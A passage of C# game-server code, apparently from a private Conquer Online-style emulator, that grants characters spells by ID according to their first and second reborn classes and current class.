                if (client.Entity.FirstRebornClass == 145 && client.Entity.SecondRebornClass == 145)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 11 || client.Entity.Class == 51 || client.Entity.Class == 21 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3080 });//Dodge
                        client.AddSpell(new Spell(true) { ID = 1000 });//
                        client.AddSpell(new Spell(true) { ID = 1001 });//
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10310 });//Heaven Blade 
                        client.AddSpell(new Spell(true) { ID = 3080 });//Dodge
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3080 });//
                        client.AddSpell(new Spell(true) { ID = 1120 });//FireCircle
                    }
                    else if (client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                    }
                }
                #endregion
                #region Fire-Tro
                if (client.Entity.FirstRebornClass == 145 && client.Entity.SecondRebornClass == 15)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 142 || client.Entity.Class == 132 || client.Entity.Class == 51 || client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//
                        client.AddSpell(new Spell(true) { ID = 1001 });//
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1270 });//
                        client.AddSpell(new Spell(true) { ID = 1110 });//
                        client.AddSpell(new Spell(true) { ID = 1190 });//
                    }
                    else if (client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//
                        client.AddSpell(new Spell(true) { ID = 1001 });//
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1110 });//
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//
                        client.AddSpell(new Spell(true) { ID = 1001 });//
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1270 });//
                        client.AddSpell(new Spell(true) { ID = 5100 });//
                        client.AddSpell(new Spell(true) { ID = 1110 });//
                        client.AddSpell(new Spell(true) { ID = 1190 });//
                    }
                    else if (client.Entity.Class == 11)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//
                        client.AddSpell(new Spell(true) { ID = 1001 });//
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 3050 });//
                    }
                }
                #endregion
                #region Fire-War
                if (client.Entity.FirstRebornClass == 145 && client.Entity.SecondRebornClass == 25)
                {

                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//
                        client.AddSpell(new Spell(true) { ID = 1001 });//
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1020 });//
                        client.AddSpell(new Spell(true) { ID = 1040 });//
                        client.AddSpell(new Spell(true) { ID = 3060 });//
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1020 });//
                        client.AddSpell(new Spell(true) { ID = 1040 });//
                        client.AddSpell(new Spell(true) { ID = 3060 });//
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//
                        client.AddSpell(new Spell(true) { ID = 1001 });//
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1015 });//
                        client.AddSpell(new Spell(true) { ID = 1040 });//
                        client.AddSpell(new Spell(true) { ID = 1320 });//
                        client.AddSpell(new Spell(true) { ID = 3060 });//
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//
                        client.AddSpell(new Spell(true) { ID = 1001 });//
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 3060 });//
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//
                        client.AddSpell(new Spell(true) { ID = 1001 });//
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 3060 });//
                        client.AddSpell(new Spell(true) { ID = 1025 });//
                        client.AddSpell(new Spell(true) { ID = 1020 });//
                        client.AddSpell(new Spell(true) { ID = 1040 });//
                    }
                }
                #endregion
                #region Fire-Water
                if (client.Entity.FirstRebornClass == 145 && client.Entity.SecondRebornClass == 135)
                {

                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1050 });//
                        client.AddSpell(new Spell(true) { ID = 1055 });//
                        client.AddSpell(new Spell(true) { ID = 1175 });//
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1085 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3090 });//
                        client.AddSpell(new Spell(true) { ID = 1120 });//
                    }
                    else if (client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1085 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                    }
                }
                #endregion
                #region Fire-Nin
                if (client.Entity.FirstRebornClass == 145 && client.Entity.SecondRebornClass == 55)
                {

                    if (client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3080 });//
                        client.AddSpell(new Spell(true) { ID = 6001 });//
                        client.AddSpell(new Spell(true) { ID = 1000 });//
                        client.AddSpell(new Spell(true) { ID = 1001 });//
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                    }
                    else
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//
                        client.AddSpell(new Spell(true) { ID = 1000 });//
                        client.AddSpell(new Spell(true) { ID = 1001 });//
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                    }
                }
                #endregion
                #region Fire-Monk
                if (client.Entity.FirstRebornClass == 145 && client.Entity.SecondRebornClass == 65)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 132 || client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                        client.AddSpell(new Spell(true) { ID = 1000 });//Fire
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                    else if (client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                        client.AddSpell(new Spell(true) { ID = 1000 });//Fire
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 3080 });//Dodge
                    }
                }
                #endregion
                #region Fire-Pirate
                if (client.Entity.FirstRebornClass == 145 && client.Entity.SecondRebornClass == 75)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                    client.AddSpell(new Spell(true) { ID = 1000 });//Fire
                    client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                    client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                    client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb

                }
                #endregion
                #region Fire-Brucelee
                if (client.Entity.FirstRebornClass == 145 && client.Entity.SecondRebornClass == 85)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                    client.AddSpell(new Spell(true) { ID = 1000 });//Fire
                    client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                    client.AddSpell(new Spell(true) { ID = 1195 });//Meditation

                }
                #endregion
                #endregion
                #region War2
                #region War-Arch
                if (client.Entity.FirstRebornClass == 25 && client.Entity.SecondRebornClass == 45)
                {

                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5000 });//Freezing Frankos
                    }
                    else if (client.Entity.Class == 132 || client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1020 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 5002 });
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });
                    }
                }
                #endregion
                #region War-Fire
                if (client.Entity.FirstRebornClass == 25 && client.Entity.SecondRebornClass == 145)
                {

                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1020 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 1000 });
                        client.AddSpell(new Spell(true) { ID = 1001 });
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1020 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 3080 });
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 1000 });
                        client.AddSpell(new Spell(true) { ID = 1001 });
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                    }
                    else if (client.Entity.Class == 25)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });
                        client.AddSpell(new Spell(true) { ID = 1001 });
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1020 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 1120 });
                    }
                }
                #endregion
                #region War-Tro
                if (client.Entity.FirstRebornClass == 25 && client.Entity.SecondRebornClass == 15)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 142 || client.Entity.Class == 132 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1320 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 1110 });
                        client.AddSpell(new Spell(true) { ID = 1190 });
                        client.AddSpell(new Spell(true) { ID = 1270 });
                    }
                    else if (client.Entity.Class == 11)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1320 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 3050 });
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5100 });
                        client.AddSpell(new Spell(true) { ID = 1110 });
                        client.AddSpell(new Spell(true) { ID = 1190 });
                        client.AddSpell(new Spell(true) { ID = 1270 });
                    }
                }
                #endregion
                #region War-War
                if (client.Entity.FirstRebornClass == 25 && client.Entity.SecondRebornClass == 25)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 1320 });
                        client.AddSpell(new Spell(true) { ID = 3060 });
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 1020 });
                        client.AddSpell(new Spell(true) { ID = 3060 });
                        client.AddSpell(new Spell(true) { ID = 1015 });
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10311 });//Perseverance
                        client.AddSpell(new Spell(true) { ID = 3060 });
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1025 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 1320 });
                        client.AddSpell(new Spell(true) { ID = 3060 });
                    }
                }
                #endregion
                #region War-Water
                if (client.Entity.FirstRebornClass == 25 && client.Entity.SecondRebornClass == 135)
                {

                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1020 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                        client.AddSpell(new Spell(true) { ID = 1090 });
                        client.AddSpell(new Spell(true) { ID = 1095 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                        client.AddSpell(new Spell(true) { ID = 1280 });
                        client.AddSpell(new Spell(true) { ID = 1350 });
                    }
                    if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1020 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1175 });
                        client.AddSpell(new Spell(true) { ID = 1050 });
                        client.AddSpell(new Spell(true) { ID = 1055 });
                        client.AddSpell(new Spell(true) { ID = 1280 });
                        client.AddSpell(new Spell(true) { ID = 1350 });
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                    }
                    else if (client.Entity.Class == 11)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 1085 });
                        client.AddSpell(new Spell(true) { ID = 1090 });
                        client.AddSpell(new Spell(true) { ID = 1095 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                        client.AddSpell(new Spell(true) { ID = 1280 });
                        client.AddSpell(new Spell(true) { ID = 1350 });
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1085 });
                        client.AddSpell(new Spell(true) { ID = 1090 });
                        client.AddSpell(new Spell(true) { ID = 1095 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                        client.AddSpell(new Spell(true) { ID = 1280 });
                        client.AddSpell(new Spell(true) { ID = 1350 });
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1020 });
                        client.AddSpell(new Spell(true) { ID = 1025 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 3090 });
                        client.AddSpell(new Spell(true) { ID = 1280 });
                        client.AddSpell(new Spell(true) { ID = 1350 });
                    }
                    else if (client.Entity.Class == 51 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 1085 });
                        client.AddSpell(new Spell(true) { ID = 1090 });
                        client.AddSpell(new Spell(true) { ID = 1095 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                    }
                    else if (client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 1085 });
                        client.AddSpell(new Spell(true) { ID = 1090 });
                        client.AddSpell(new Spell(true) { ID = 1095 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                    }
                }
                #endregion
                #region War-Nin
                if (client.Entity.FirstRebornClass == 25 && client.Entity.SecondRebornClass == 55)
                {

                    if (client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1320 });
                        client.AddSpell(new Spell(true) { ID = 1040 });

                    }
                    else
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1320 });
                        client.AddSpell(new Spell(true) { ID = 1040 });
                        client.AddSpell(new Spell(true) { ID = 6001 });

                    }
                }
                #endregion
                #region War-Monk
                if (client.Entity.FirstRebornClass == 25 && client.Entity.SecondRebornClass == 65)
                {

                    if (client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 142 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 1320 });//FlyingMoon
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                    else if (client.Entity.Class == 11)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 1320 });//FlyingMoon
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 1320 });//FlyingMoon
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 3080 });// Dodge
                    }
                }
                #endregion
                #region War-Pirate
                if (client.Entity.FirstRebornClass == 25 && client.Entity.SecondRebornClass == 75)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                    client.AddSpell(new Spell(true) { ID = 1320 });//FlyingMoon
                    client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                    client.AddSpell(new Spell(true) { ID = 3060 });// Reflec

                }
                #endregion
                #region War-Brucelee
                if (client.Entity.FirstRebornClass == 25 && client.Entity.SecondRebornClass == 85)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                    client.AddSpell(new Spell(true) { ID = 1320 });//FlyingMoon
                    client.AddSpell(new Spell(true) { ID = 3060 });// Reflec

                }
                #endregion
                #endregion
                #region Water2
                #region Water-Arch
                if (client.Entity.FirstRebornClass == 135 && client.Entity.SecondRebornClass == 45)
                {

                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                        client.AddSpell(new Spell(true) { ID = 1090 });
                        client.AddSpell(new Spell(true) { ID = 1095 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                        client.AddSpell(new Spell(true) { ID = 5000 });
                        client.AddSpell(new Spell(true) { ID = 5002 });
                    }
                    else if (client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                        client.AddSpell(new Spell(true) { ID = 1090 });
                        client.AddSpell(new Spell(true) { ID = 1095 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                        client.AddSpell(new Spell(true) { ID = 5000 });
                        client.AddSpell(new Spell(true) { ID = 5002 });
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                    }
                    else if (client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                        client.AddSpell(new Spell(true) { ID = 1090 });
                        client.AddSpell(new Spell(true) { ID = 1095 });
                        client.AddSpell(new Spell(true) { ID = 1085 });//Star Of Accuracy
                        client.AddSpell(new Spell(true) { ID = 5000 });
                        client.AddSpell(new Spell(true) { ID = 5002 });
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                    }
                    else
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                        client.AddSpell(new Spell(true) { ID = 1090 });
                        client.AddSpell(new Spell(true) { ID = 1095 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                        client.AddSpell(new Spell(true) { ID = 5000 });
                        client.AddSpell(new Spell(true) { ID = 5002 });
                    }
                }
                #endregion
                #region Water-Fire
                if (client.Entity.FirstRebornClass == 135 && client.Entity.SecondRebornClass == 145)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 | client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1050 });
                        client.AddSpell(new Spell(true) { ID = 1175 });
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                        client.AddSpell(new Spell(true) { ID = 1055 });
                        client.AddSpell(new Spell(true) { ID = 1000 });
                        client.AddSpell(new Spell(true) { ID = 1001 });
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                    }
                    else if (client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1050 });
                        client.AddSpell(new Spell(true) { ID = 1175 });
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                        client.AddSpell(new Spell(true) { ID = 1055 });
                        client.AddSpell(new Spell(true) { ID = 1000 });
                        client.AddSpell(new Spell(true) { ID = 1001 });
                        client.AddSpell(new Spell(true) { ID = 1005 });
                        client.AddSpell(new Spell(true) { ID = 1195 });
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1050 });
                        client.AddSpell(new Spell(true) { ID = 1175 });
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                        client.AddSpell(new Spell(true) { ID = 1055 });
                        client.AddSpell(new Spell(true) { ID = 1120 });
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1050 });
                        client.AddSpell(new Spell(true) { ID = 1175 });
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                        client.AddSpell(new Spell(true) { ID = 1055 });
                        client.AddSpell(new Spell(true) { ID = 3080 });
                    }
                }

                #endregion
                #region Water-Tro
                if (client.Entity.FirstRebornClass == 135 && client.Entity.SecondRebornClass == 15)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 142 || client.Entity.Class == 132 || client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1085 });//StarOfAccuracy
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                    }
                    else if (client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1085 });//StarOfAccuracy
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
